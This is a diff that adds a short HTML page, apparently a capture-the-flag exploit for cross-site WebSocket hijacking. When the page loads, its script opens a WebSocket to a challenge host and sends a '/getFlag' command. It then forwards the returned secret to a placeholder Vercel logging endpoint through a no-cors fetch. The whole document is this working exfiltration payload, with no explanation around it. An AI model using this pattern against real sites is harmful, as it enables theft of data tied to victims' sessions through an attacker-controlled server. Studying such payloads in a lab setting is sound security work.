@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
+
+      ws.onopen = () => {
+        ws.send(JSON.stringify({ message: '/getFlag' }));
+      };
+
+      ws.onmessage = ev => {
+        const flag = JSON.parse(ev.data).message;
+
+        fetch('https://your-vercel-project.vercel.app/api/log?flag=' + encodeURIComponent(flag), {
+          mode: 'no-cors'
+        });
+      };
+    </script>
+  </body>
+</html>
